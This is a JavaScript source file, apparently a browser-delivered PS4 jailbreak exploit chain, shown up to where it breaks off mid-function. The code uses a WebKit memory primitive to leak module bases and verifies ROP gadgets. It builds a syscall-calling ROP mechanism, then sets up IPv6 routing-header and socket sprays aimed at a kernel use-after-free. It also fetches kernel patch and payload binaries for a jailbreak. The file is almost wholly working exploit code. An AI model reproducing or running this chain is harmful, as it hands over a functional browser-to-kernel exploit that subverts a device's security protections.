// chain_poops_v6.js — landUio con yield/drain + NUM_UIO_SPRAY reducido
// ?v=10 must match mem.js's specifier EXACTLY or core.js builds a second
// module record and releaseFakeCell() (only call site: mem.js:662) reaches a
// virgin instance, pinning ~137 MB for the life of the page.
import { establishPrimitive } from "./core.js?v=10";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets.js";

const outEl = document.getElementById("out");
const stateEl = document.getElementById("state");
const lines = [];
let passCount = 0, failCount = 0;
const params = new URLSearchParams(location.search);
const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";

// ============================================================
// AJUSTES RÁPIDOS
// ============================================================
const CFG_IOV_WORKERS   = 1;
const CFG_UIO_WORKERS   = 1;
const CFG_ATTEMPTS      = 4;
const CFG_MSDELAY       = 2;
const CFG_USE_REALTIME  = 0;
const CFG_USE_PAIR      = 0;
const CFG_VERBOSE       = 1;

const CFG_DO_MAKE_KARW  = 1;
const CFG_DO_JAILBREAK  = 1;
const CFG_DO_KPATCH     = 1;
const CFG_DO_PAYLOAD    = 1;
// ============================================================

// ============================================================
// TELEMETRÍA
// ============================================================
const TM = window.__TM = window.__TM || {
    startedAt: Date.now(), errors: [], stages: {}, diagnostics: {}
};
function tmStage(tag, detail) {
    try {
        const now = Date.now() - TM.startedAt;
        if (!TM.stages[tag]) TM.stages[tag] = { count: 0, first: null, last: null, samples: [] };
        const s = TM.stages[tag];
        s.count++;
        const text = String(detail || '').slice(0, 120);
        if (!s.first) s.first = { ts: now, detail: text };
        s.last = { ts: now, detail: text };
        if (s.samples.length < 3) s.samples.push({ ts: now, detail: text });
        if (window.__TM.render) window.__TM.render();
    } catch (e) { }
}
function tmDiag(name, value) {
    try { if (window.__TM) { window.__TM.diagnostics[name] = value; if (window.__TM.render) window.__TM.render(); } } catch (e) { }
}
function post(tag, detail) {
    try {
        tmStage(tag, detail);
        const x = new XMLHttpRequest();
        x.open("POST", "t", true);
        x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        x.send("PS4-S10&tag=" + encodeURIComponent(tag) + "&detail=" + encodeURIComponent(String(detail == null ? "" : detail)));
    } catch (e) { }
}
const VERBOSE = CFG_VERBOSE === 1 || params.get("verbose") === "1";
const PROSE = [/ -- /, /\.\s/, /;\s/, /,\s+(which|so|and that|because|since|as that)\s/, /\s+(because|rather than|instead of|so that|which is|which means|which the|so the)\s/, /\s+so\s+[a-z]/, /\s+\([a-z][^)]{40,}\)/];
function terse(s) {
    if (VERBOSE || s == null) return s;
    s = String(s);
    for (const re of PROSE) { const m = re.exec(s); if (m && m.index > 0) s = s.slice(0, m.index); }
    s = s.replace(/\s+$/, "");
    if (s.length > 140) s = s.slice(0, 140) + "...";
    return s;
}
function mark(tag, detail) {
    const raw = detail;
    detail = terse(detail);
    lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
    const esc = t => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
    outEl.innerHTML = lines.map(function (l) {
        l = esc(l);
        const c = /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED/i.test(l) ? "bad"
                : /WARN|SKIP|REFUSED|COMMITTED|DIRTY/i.test(l) ? "warn"
                : /\bOK\b|PASS|ACHIEVED|RUNNING|ARMED/i.test(l) ? "ok" : "";
        return c ? '<span class="' + c + '">' + l + "</span>" : l;
    }).join("\n");
    outEl.scrollTop = outEl.scrollHeight;
    post(tag, raw);
}
function trace(tag, detail) { if (VERBOSE) mark(tag, detail); else post(tag, detail); }
function state(t, c) { stateEl.textContent = t; stateEl.className = c || ""; }
function check(name, ok, detail) {
    try {
        if (window.__TM) {
            window.__TM.diagnostics[name] = ok ? 'PASS' : 'FAIL';
            if (!ok) window.__TM.errors.push({ ts: Date.now() - window.__TM.startedAt, message: 'CHECK-FAIL: ' + name + '  ' + (detail || ''), file: 'chain_poops_v6.js', line: 0, col: 0, stack: '' });
            if (window.__TM.render) window.__TM.render();
        }
    } catch (e) { }
    if (ok) { passCount++; mark("PROOF-OK", name + (detail ? "  " + detail : "")); }
    else { failCount++; mark("PROOF-FAIL", name + (detail ? "  " + detail : "")); }
    return ok;
}
function hx(n) { return "0x" + (n >>> 0).toString(16); }

const SYS = { read: 3, write: 4, close: 6, getpid: 20, setuid: 0x17,
              getuid: 0x18, dup: 0x29, sendmsg: 0x1c, recvmsg: 0x1b,
              socket: 0x61, netcontrol: 0x63, socketpair: 0x87, kqueue: 0x16a,
              readv: 0x78, writev: 0x79, sysctl: 0xca, pipe: 0x2a, fcntl: 0x5c,
              setsockopt: 0x69, getsockopt: 0x76, sched_yield: 0x14b,
              rtprio_thread: 0x1d2, cpuset_setaffinity: 0x1e8,
              cpuset_getaffinity: 0x1e7, thr_self: 432,
              ioctl: 0x36, mmap: 0x1dd, jitshm_create: 0x215, kexec: 0x295,
              nanosleep: 0xf0 };
const SYS_NAMES = Object.keys(SYS);

const NETEVENT_SET_QUEUE = 0x20000003, NETEVENT_CLEAR_QUEUE = 0x20000007;
const AF_UNIX = 1, AF_INET6 = 28, SOCK_STREAM = 1;
const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
const UCRED_SIZE = 0x168;
const KQUEUE_SIZE = 0x100;
const NUM_LEAK_KQUEUE = 5000;
const KQ_BATCH = 8;
const KQ_HDR_MAGIC = 0x1430000;

const NUM_UIO_IOV = 0x14, UIO_SIZE = 0x30;
// *** FIX: bajado de 10000 a 512 para evitar OOM ***
const NUM_UIO_SPRAY = 512;
const NUM_IOV_SPRAY_MAX = 100000;
const UIO_READ = 0, UIO_WRITE = 1, UIO_SYSSPACE = 1;
const SOL_SOCKET = 0xffff, SO_SNDBUF = 0x1001;

const PIPEBUF_SIZEOF = 0x18, PIPE_PAGE = 0x4000, FILEDESCENT_SIZE = 8;
const F_SETFL = 4, O_NONBLOCK = 4;
const IP6_RTHDR0_SIZE = 8, IN6_ADDR_SIZE = 0x10;
const NUM_MSG_IOV = 0x17, IOVEC_SIZE = 0x10, MSGHDR_SIZE = 0x30;
const NUM_IPV6_SOCK = 0x100;

const RTHDR_TAG = 0x13370000;
const MAX_ROUNDS_TWIN = 15;
const MAX_ROUNDS_TRIPLET = 800;
const FIND_TRIPLET_FAST = 8000;

const RTP_PRIO_REALTIME = 2, RTP = 0x100, RTP_SET = 1, MAIN_CORE = 7;
const RTP_LOOKUP = 0, RTP_PRIO_NORMAL = 0;
const CPU_LEVEL_WHICH = 3, CPU_WHICH_TID = 1;
const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);

const keepAlive = [];
const workers = [];
let mainMf = null, mainOrig = null, mainArmed = false;
let committed = false, rebootRequired = false;

let kreadPoisoned = false;
let uafSock = 0;
let uafFpSaved = null;

let savedMask = null, savedPrio = null, restoreCtx = null, attrsRestored = false;

let allDone = false;

let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe = null;

(async function () {
    let p = null;
    let sc = null;

    try {
        const NUM_IOV_WORKER = CFG_IOV_WORKERS;
        const NUM_ATTEMPT = CFG_ATTEMPTS;
        const NUM_IOV_SPRAY = params.has("spray") ? parseInt(params.get("spray"), 10) : 0x200;
        const MS_DELAY = CFG_MSDELAY;

        mark("SYS-TABLE", "entries=" + SYS_NAMES.length
            + " sendmsg=" + SYS.sendmsg + " dup=" + SYS.dup
            + " recvmsg=" + SYS.recvmsg + " close=" + SYS.close
            + " netcontrol=" + SYS.netcontrol + " socket=" + SYS.socket
            + " nanosleep=" + SYS.nanosleep);

        const { key, off } = offsetsFor(navigator.userAgent);
        mark("FW", key || "(not a PS4 UA)");
        if (!off) { state("no offsets for this firmware", "bad"); return; }
        mark("FW-STATUS", off.fw_status || "none");
        mark("PLAN", "iov=" + NUM_IOV_WORKER + " uio=" + CFG_UIO_WORKERS
            + " attempts=" + NUM_ATTEMPT + " msdelay=" + MS_DELAY
            + " rtp=" + CFG_USE_REALTIME + " pair=" + CFG_USE_PAIR
            + " uio_spray=" + NUM_UIO_SPRAY
            + " karw=" + CFG_DO_MAKE_KARW + " jb=" + CFG_DO_JAILBREAK
            + " kp=" + CFG_DO_KPATCH + " pl=" + CFG_DO_PAYLOAD);

        tmDiag('fw_key', key);

        let kpatch = null, aiofix = null, payload = null;
        const kpatchName = off && off.kpatch ? "patches/" + off.kpatch
            : key ? "patches/" + key.replace(".", "") + ".bin" : null;
        const KPATCH_JMP_SITES = [];
        try {
            if (kpatchName) {
                const r = await fetch(kpatchName);
                if (r.ok) kpatch = new Uint8Array(await r.arrayBuffer());
            }
        } catch (e) { mark("KPATCH-FETCH-THREW", e.message); }
        if (kpatch) {
            for (let i = 0; i + 7 <= kpatch.length; ++i) {
                if (kpatch[i] !== 0xc6 || kpatch[i + 1] !== 0x81) continue;
                if (kpatch[i + 6] !== 0xeb) continue;
                KPATCH_JMP_SITES.push(((kpatch[i + 2]) | (kpatch[i + 3] << 8)
                    | (kpatch[i + 4] << 16) | (kpatch[i + 5] << 24)) >>> 0);
            }
        }
        mark("KPATCH-BLOB", kpatch ? "bytes=" + kpatch.length + " sites=" + KPATCH_JMP_SITES.length : "MISSING");

        try {
            const r = await fetch("afix1.bin");
            if (r.ok) aiofix = new Uint8Array(await r.arrayBuffer());
        } catch (e) { mark("AIOFIX-FETCH-THREW", e.message); }
        mark("AIOFIX-BLOB", aiofix
            ? "bytes=" + aiofix.length + " magic=" + (aiofix[0] === 0x7f ? "ELF" : "0x" + aiofix[0].toString(16))
            : "MISSING");

        try {
            const r = await fetch("payload.bin");
            if (r.ok) payload = new Uint8Array(await r.arrayBuffer());
        } catch (e) { mark("PAYLOAD-FETCH-THREW", e.message); }
        mark("PAYLOAD-BLOB", payload ? "bytes=" + payload.length + " magic=" + (payload[0] === 0xe9 ? "e9-jmp" : (payload[0] === 0x7f ? "ELF" : "0x" + payload[0].toString(16))) : "MISSING");

        state("running the primitive...", "warn");
        await new Promise(r => setTimeout(r, 0));

        const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
        const carrier = await establishPrimitive({
            maxAttempts: 12,
            onEvent: (t, d, a) => (PRIMITIVE_LOUD.test(t) ? mark : trace)(t, (a != null ? "[" + a + "] " : "") + (d || ""))
        });
        const PAIR_ON = CFG_USE_PAIR === 1;

        installWindowP(carrier, {
            promote: PAIR_ON,
            onEvent: (t, d) => (PRIMITIVE_LOUD.test(t) ? mark : trace)(t, d || "")
        });
        if (!window.p) throw new Error("window.p was not installed");
        p = window.p;
        mark("PAIR-STATUS", "state=" + pairStatus.state + " promoted=" + pairStatus.promoted);
        mark("PRIMITIVE-OK", "");

        const cell = p.leakval(Math.expm1);
        const nativeFn = p.read8(p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function));
        const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
        const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
        const libkernelBase = errorFn.sub32(off.k__error);
        mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
        const aligned = v => v.hi > 0 && (v.low & 0x3fff) === 0;
        if (!check("module-bases-0x4000-aligned", aligned(webkitBase) && aligned(libkernelBase), "")) return;

        const G = {};
        const GAD = [
            ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
            ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3]],
            ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3]],
            ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3]],
            ["POP_R8_RET", off.wk_POP_R8_RET, [null, 0x58, 0xc3]],
            ["POP_R9_RET", off.wk_POP_R9_RET, [null, 0x59, 0xc3]],
            ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3]],
            ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3]],
            ["MOV_RDI_RAX_RET", off.wk_MOV_QWORD_PTR_RDI_RAX_RET, [0x48, 0x89, 0x07, 0xc3]],
            ["G0", off.wk_MOV_RDI_RSI_30_CALL, [0x48, 0x8b, 0x7e, 0x30]],
            ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [0x58, 0x48, 0x8b, 0x07]],
            ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [0x55, 0x48, 0x89, 0xe5]],
            ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [0x48, 0x8b, 0x78, 0x08]],
            ["G4", off.wk_MOV_RDX_RAX_18_CALL_10, [0x48, 0x8b, 0x50, off.pivot_view_sp]],
            ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3]],
        ];
        let gated = 0;
        for (const [nm, rva, pat] of GAD) {
            const a = webkitBase.add32(rva);
            let good = true;
            for (let i = 0; i < pat.length; ++i) {
                if (pat[i] === null) continue;
                if (p.read1(a.add32(i)) !== pat[i]) { good = false; break; }
            }
            if (good) { G[nm] = a; gated++; } else mark("GADGET-BAD", nm);
        }
        if (!check("gadget-table-fits-module", gated === GAD.length, gated + "/" + GAD.length)) return;
        const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET, G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];

        const stubAddr = new Map();
        let seeded = 0;
        if (off.k_stubs) {
            for (const numStr in off.k_stubs) {
                const num = +numStr, o = off.k_stubs[numStr];
                const v = p.read8(libkernelBase.add32(o));
                if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
                if ((((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0) !== num) continue;
                stubAddr.set(num, libkernelBase.add32(o)); seeded++;
            }
        }
        const need = new Set(Object.keys(SYS).map(k => SYS[k]).filter(n => !stubAddr.has(n)));
        let scanned = 0;
        for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
            const v = p.read8(libkernelBase.add32(o));
            if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
            const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
            if (!need.has(num)) continue;
            stubAddr.set(num, libkernelBase.add32(o)); need.delete(num); scanned++;
        }
        mark("STUBS", "seeded=" + seeded + " scanned=" + scanned);
        const missingStubs = [];
        for (const name in SYS) if (!stubAddr.has(SYS[name])) missingStubs.push(name + "=" + hx(SYS[name]));
        mark("MISSING-STUBS", missingStubs.length ? missingStubs.join(" ") : "none -- all " + Object.keys(SYS).length + " resolved");
        const miss = Object.keys(SYS).filter(k => !stubAddr.has(SYS[k]));
        if (!check("syscall-page-needs-stub", miss.length === 0, miss.join(","))) return;

        function bufAddr(ab) {
            const c = p.leakval(ab);
            return p.read8(p.read8(c.add32(off.wk_ArrayBuffer_m_impl)).add32(off.wk_ArrayBuffer_m_contents_m_data));
        }
        function put(dv, at, v) {
            if (typeof v === "number") { dv.setUint32(at, v >>> 0, true); dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true); }
            else { dv.setUint32(at, v.low >>> 0, true); dv.setUint32(at + 4, v.hi >>> 0, true); }
        }
        const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
        function makeCtx() {
            const sb = new ArrayBuffer(0x20), pb = new ArrayBuffer(PB_SIZE);
            const kb = new ArrayBuffer(0x2000), fb = new ArrayBuffer(0x40);
            keepAlive.push(sb, pb, kb, fb);
            const c = { storeDv: new DataView(sb), pivotDv: new DataView(pb), stackDv: new DataView(kb), frameDv: new DataView(fb), stackU8: new Uint8Array(kb), frameU8: new Uint8Array(fb) };
            keepAlive.push(c.storeDv, c.pivotDv, c.stackDv, c.frameDv, c.stackU8, c.frameU8);
            c.S = bufAddr(sb); c.P = bufAddr(pb); c.K = bufAddr(kb); c.F = bufAddr(fb);
            put(c.storeDv, 0x00, G.G1); put(c.storeDv, 0x08, c.P);
            put(c.storeDv, 0x10, G.G3); put(c.storeDv, 0x18, G.G2);
            put(c.pivotDv, 0x00, c.P); put(c.pivotDv, 0x10, G.G5);
            put(c.pivotDv, 0x20, G.G4);
            return c;
        }
        function layout(c, target, args) {
            c.stackU8.fill(0); c.frameU8.fill(0);
            const insts = [];
            for (let i = 0; i < args.length; ++i) {
                if (!argGadget[i] || typeof argGadget[i].low !== "number") throw new Error("layout: argGadget[" + i + "] is not an int64");
                insts.push(argGadget[i]); insts.push(args[i]);
            }
            const targetIdx = insts.length;
            insts.push(target);
            insts.push(G.POP_RDI_RET); insts.push(c.F);
            insts.push(G.MOV_RDI_RAX_RET);
            insts.push(G.POP_RAX_RET); insts.push(JSVALUE_UNDEFINED);
            insts.push(G.LEAVE_RET);
            let at = 0x2000 - 8 * insts.length;
            if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
            for (let i = 0; i < insts.length; ++i) put(c.stackDv, at + 8 * i, insts[i]);
            put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
        }
        const M = makeCtx();
        mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
        mainOrig = p.read8(mainMf);
        const pivotObj = {};
        keepAlive.push(pivotObj);

        let pivotCell = null;
        try { pivotCell = p.leakval(pivotObj); } catch (le) { mark("PIVOT-LEAKVAL-THREW", le.message); }
        if (!pivotCell || typeof pivotCell.low !== "number" || typeof pivotCell.hi !== "number") {
            mark("PIVOT-CELL-INVALID", "pivotCell=" + pivotCell);
            state("PRIMITIVA INESTABLE", "bad");
            return;
        }
        mark("PIVOT-CELL", "pivotCell=" + pivotCell);
        p.write8(mainMf, G.G0);
        mainArmed = true;

        function callAddr(target, args) {
            if (!target || typeof target.low !== "number") throw new Error("callAddr: target is not an int64");
            layout(M, target, args);
            const saved = p.read8(pivotCell);
            if (!saved || typeof saved.low !== "number") throw new Error("callAddr: saved invalid");
            p.write8(pivotCell, M.S);
            Math.expm1(pivotObj);
            p.write8(pivotCell, saved);
            return { lo: M.frameDv.getUint32(0, true), hi: M.frameDv.getUint32(4, true), i32: M.frameDv.getUint32(0, true) | 0 };
        }
        sc = function (num) {
            const a = Array.prototype.slice.call(arguments, 1);
            if (num === undefined || num === null || typeof num !== "number") throw new Error("sc: num is " + num);
            const stub = stubAddr.get(num);
            if (!stub || typeof stub.low !== "number") throw new Error("sc: no stub for syscall " + num);
            return callAddr(stub, a);
        };

        function errno() {
            const r = callAddr(errorFn, []);
            const a = new int64(r.lo, r.hi);
            return (a.hi === 0 && a.low === 0) ? -1 : p.read4(a) | 0;
        }
        const pid = sc(SYS.getpid).i32;
        check("chain-reaches-kernel", pid > 0, "pid=" + pid + " uid=" + sc(SYS.getuid).i32);

        const scratchAb = new ArrayBuffer(0x1000); keepAlive.push(scratchAb);
        const scratch = bufAddr(scratchAb);
        const argAb = new ArrayBuffer(8); keepAlive.push(argAb);
        const argAddr = bufAddr(argAb), argDv = new DataView(argAb);
        const lenAb = new ArrayBuffer(0x10); keepAlive.push(lenAb);
        const lenAddr = bufAddr(lenAb), lenDv = new DataView(lenAb);

        function nanosleepMs(ms) {
            const sec = Math.floor(ms / 1000);
            const nsec = ((ms % 1000) * 1000000) >>> 0;
            lenDv.setUint32(0, sec, true); lenDv.setUint32(4, 0, true);
            lenDv.setUint32(8, nsec, true); lenDv.setUint32(12, 0, true);
            return sc(SYS.nanosleep, lenAddr, 0).i32;
        }

        const sprayAb = new ArrayBuffer(UCRED_SIZE); keepAlive.push(sprayAb);
        const sprayAddr = bufAddr(sprayAb), sprayDv = new DataView(sprayAb);
        const leakAb = new ArrayBuffer(UCRED_SIZE); keepAlive.push(leakAb);
        const leakAddr = bufAddr(leakAb), leakDv = new DataView(leakAb);
        const leakU8 = new Uint8Array(leakAb);
        const R2_ON = params.get("r2") !== "0";
        let shortReads = 0;

        const burned = new Set();
        function burn(fd, why) {
            if (fd > 0 && !burned.has(fd)) { burned.add(fd); mark("BURNED", "fd=" + fd + " why=" + why); }
        }

        function buildRthdr(dv, size) {
            const n = Math.floor((size - IP6_RTHDR0_SIZE) / IN6_ADDR_SIZE);
            new Uint8Array(dv.buffer).fill(0);
            dv.setUint8(0, 0); dv.setUint8(1, n * 2); dv.setUint8(2, 0); dv.setUint8(3, n);
            return IP6_RTHDR0_SIZE + IN6_ADDR_SIZE * n;
        }
        const sprayLen = buildRthdr(sprayDv, UCRED_SIZE);
        const setRthdr = s => sc(SYS.setsockopt, s, IPPROTO_IPV6, IPV6_RTHDR, sprayAddr, sprayLen).i32;
        const freeRthdr = s => {
            if (burned.has(s)) { mark("FREERTHDR-REFUSED", "fd=" + s); return -1; }
            return sc(SYS.setsockopt, s, IPPROTO_IPV6, IPV6_RTHDR, 0, 0).i32;
        };
        function getRthdr(s, size, need) {
            if (R2_ON) leakU8.fill(0xee, 0, Math.min(size, UCRED_SIZE));
            lenDv.setUint32(0, size, true);
            const rv = sc(SYS.getsockopt, s, IPPROTO_IPV6, IPV6_RTHDR, leakAddr, lenAddr).i32;
            if (rv !== 0) return -1;
            const got = lenDv.getUint32(0, true);
            if (R2_ON && need !== undefined && got < need) { shortReads++; return -1; }
            return got;
        }
        function netevent(sock, event) {
            argDv.setUint32(0, sock >>> 0, true); argDv.setUint32(4, 0, true);
            const r = sc(SYS.netcontrol, -1, event, argAddr, 8).i32;
            return { rv: r, err: r === -1 ? errno() : 0 };
        }

        const iovAb = new ArrayBuffer(IOVEC_SIZE * NUM_MSG_IOV);
        const msgAb = new ArrayBuffer(MSGHDR_SIZE);
        keepAlive.push(iovAb, msgAb);
        const iovAddr = bufAddr(iovAb), msgAddr = bufAddr(msgAb);
        const iovDv = new DataView(iovAb), msgDv = new DataView(msgAb);
        new Uint8Array(iovAb).fill(0); put(iovDv, 0, 1); put(iovDv, 8, 1);
        new Uint8Array(msgAb).fill(0); put(msgDv, 0x10, iovAddr); msgDv.setInt32(0x18, NUM_MSG_IOV, true);

        state("setting up...", "warn");
        if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1) throw new Error("socketpair failed");
        const iovSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
        if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1) throw new Error("uio socketpair failed");
        const uioSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
        mark("IOV-SS", "iov=" + iovSs.join(",") + " uio=" + uioSs.join(","));

        if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("master pipe failed");
        const masterPipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
        if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("slave pipe failed");
        const slavePipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
        check("karw-pipe-pairs-exist", masterPipe[0] > 0 && masterPipe[1] > 0 && slavePipe[0] > 0 && slavePipe[1] > 0, "master " + masterPipe + "  slave " + slavePipe);

        const dummyAb = new ArrayBuffer(0x1000); keepAlive.push(dummyAb);
        new Uint8Array(dummyAb).fill(0x41);
        const dummyAddr = bufAddr(dummyAb);
        const uioIovAb = new ArrayBuffer(IOVEC_SIZE * NUM_UIO_IOV);
        keepAlive.push(uioIovAb);
        const uioIovAddr = bufAddr(uioIovAb), uioIovDv = new DataView(uioIovAb);
        new Uint8Array(uioIovAb).fill(0); put(uioIovDv, 0, dummyAddr);
        const ipv6 = [];
        for (let i = 0; i < NUM_IPV6_SOCK; ++i) {
            const s = sc(SYS.socket, AF_INET6, SOCK_STREAM, 0).i32;
            if (s === -1) break;
            ipv6.push(s);
        }
        _ipv6 = ipv6; _iovSs = iovSs; _uioSs = uioSs; _masterPipe = masterPipe; _slavePipe = slavePipe;
        check("reclaim-sockets-open", ipv6.length === NUM_IPV6_SOCK, ipv6.length + "/" + NUM_IPV6_SOCK);

        function makeRpc(w, name) {
            let seq = 0;
            const pending = new Map();
            w.onmessage = function (e) {
                const d = e.data || {};
                const slot = pending.get(d.id);
                if (!slot) return;
                pending.delete(d.id);
                if (slot.timer) clearTimeout(slot.timer);
                if (d.type === "err") slot.reject(new Error(String(d.value)));
                else slot.resolve(d.value);
            };
            w.onerror = e => mark("WORKER-ONERROR", name + " " + ((e && e.message) ? e.message : String(e)));
            return function call(fname, timeoutMs, ...args) {
                return new Promise(function (resolve, reject) {
                    const id = seq++;
                    const timer = timeoutMs > 0 ? setTimeout(function () { pending.delete(id); reject(new Error(name + ": timeout waiting for " + fname)); }, timeoutMs) : null;
                    pending.set(id, { resolve, reject, timer });
                    w.postMessage({ id: id, name: fname, args: args });
                });
            };
        }
        function ptrish(v) { return v && v.hi > 0 && v.hi < 0x10000 && (v.low & 7) === 0; }

        const NUM_UIO_WORKER = CFG_UIO_WORKERS;
        const TOTAL_WORKERS = NUM_IOV_WORKER + NUM_UIO_WORKER;
        state("bringing up " + TOTAL_WORKERS + " workers...", "warn");
        mark("WORKER-PLAN", "iov=" + NUM_IOV_WORKER + " uio=" + NUM_UIO_WORKER + " total=" + TOTAL_WORKERS);
        for (let i = 0; i < TOTAL_WORKERS; ++i) {
            const name = (i < NUM_IOV_WORKER ? "iov" : "uio") + (i < NUM_IOV_WORKER ? i : i - NUM_IOV_WORKER);
            const w = { name: name, armed: false, wired: false };
            workers.push(w);
            try {
                w.worker = new Worker("rpc_worker.js");
                w.rpc = makeRpc(w.worker, name);
                if ((await w.rpc("ping", 5000)) !== "pong") throw new Error(name + " did not answer ping");
                const sLo = (0x10100000 | i) >>> 0, sHi = (0xc0de0000 | i) >>> 0;
                const arr = await w.rpc("init", 5000, sLo, sHi);
                keepAlive.push(arr);
                const D = bufAddr(arr.buffer);
                if ((p.read4(D) >>> 0) !== sLo) throw new Error(name + ": transfer did not preserve the store");
                const storage = p.read8(D.add32(0x10));
                const mc = ptrish(storage) ? p.read8(storage.add32(8)) : null;
                if (!mc || !ptrish(mc)) throw new Error(name + ": walk failed");
                const bf = p.read8(mc.add32(8));
                let wm = null, wv = null, wl = null;
                for (let k = 1; k <= 8; ++k) {
                    const val = p.read8(bf.sub32(8 * k));
                    if (!ptrish(val)) continue;
                    const inl = p.read8(val.add32(0x10));
                    const len = p.read4(val.add32(0x18)) >>> 0;
                    if (inl.hi === 0 && inl.low === 2) { if (!wl) wl = val; }
                    else if (inl.hi > 0 && len === 6) { if (!wm) wm = val; }
                    else if (inl.hi > 0 && len === 0x30) { if (!wv) wv = val; }
                }
                if (!(wm && wv && wl)) throw new Error(name + ": shapes not found");
                w.master = wm; w.origVector = p.read8(wm.add32(0x10));
                p.write8(wm.add32(0x10), wv); w.wired = true;
                await w.rpc("setup", 5000, wl.low, wl.hi);
                await w.rpc("armPivot", 5000, G.G0.low, G.G0.hi);
                w.armed = true;
                w.ctx = makeCtx();
                mark("WORKER-UP", name + " ok");
            } catch (workerErr) {
                mark("WORKER-FAILED", name + " threw: " + (workerErr && workerErr.message ? workerErr.message : String(workerErr)));
                try { if (w.worker) w.worker.terminate(); } catch (e) { }
                workers.pop();
                continue;
            }
            await new Promise(r => setTimeout(r, 100));
        }
        if (workers.length < 1) { mark("TOO-FEW-WORKERS", "only " + workers.length); state("TOO FEW WORKERS -- reboot", "bad"); return; }
        const iovWorkers = workers.filter(w => w.name.startsWith("iov"));
        const uioWorkers = workers.filter(w => w.name.startsWith("uio"));
        mark("WORKER-POOLS", "iov=" + iovWorkers.length + " uio=" + uioWorkers.length + " total=" + workers.length);

        const prioAb = new ArrayBuffer(8), maskAb = new ArrayBuffer(0x10);
        keepAlive.push(prioAb, maskAb);
        const prioAddr = bufAddr(prioAb), maskAddr = bufAddr(maskAb);
        const prioDv = new DataView(prioAb), maskDv = new DataView(maskAb);

        new Uint8Array(maskAb).fill(0);
        sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID, new int64(0xffffffff, 0xffffffff), 0x10, maskAddr);
        savedMask = new int64(maskDv.getUint32(0, true), maskDv.getUint32(4, true));
        prioDv.setUint16(0, 0xffff, true); prioDv.setUint16(2, 0xffff, true);
        sc(SYS.rtprio_thread, RTP_LOOKUP, 0, prioAddr);
        savedPrio = [prioDv.getUint16(0, true), prioDv.getUint16(2, true)];

        async function restoreThreadAttrs(why) {
            if (attrsRestored || !savedMask || !savedPrio) return;
            attrsRestored = true;
            const ID = new int64(0xffffffff, 0xffffffff);
            new Uint8Array(maskAb).fill(0);
            maskDv.setUint32(0, savedMask.low, true); maskDv.setUint32(4, savedMask.hi, true);
            const ar = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID, ID, 0x10, maskAddr).i32;
            prioDv.setUint16(0, savedPrio[0], true); prioDv.setUint16(2, savedPrio[1], true);
            const pr = sc(SYS.rtprio_thread, RTP_SET, 0, prioAddr).i32;
            mark("THREAD-ATTRS-RESTORED", "at=" + why + " affinity=" + ar + " rtprio=" + pr);
            let wr = 0, wn = 0;
            for (const w of workers) {
                try {
                    if (!w.armed) continue;
                    wn++;
                    new Uint8Array(maskAb).fill(0xff);
                    await fireW(w, SYS.cpuset_setaffinity, [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID, 0x10, maskAddr], 3000);
                    prioDv.setUint16(0, RTP_PRIO_NORMAL, true); prioDv.setUint16(2, 0, true);
                    await fireW(w, SYS.rtprio_thread, [RTP_SET, 0, prioAddr], 3000);
                    wr++;
                } catch (e) { }
            }
            mark("WORKER-ATTRS-RESTORED", "at=" + why + " n=" + wr + "/" + wn);
        }
        restoreCtx = { restore: restoreThreadAttrs };
        mark("THREAD-ATTRS-SAVED", "mask=" + savedMask + " rtprio={" + savedPrio + "}");

        function fireW(w, num, args, timeoutMs) {
            layout(w.ctx, stubAddr.get(num), args);
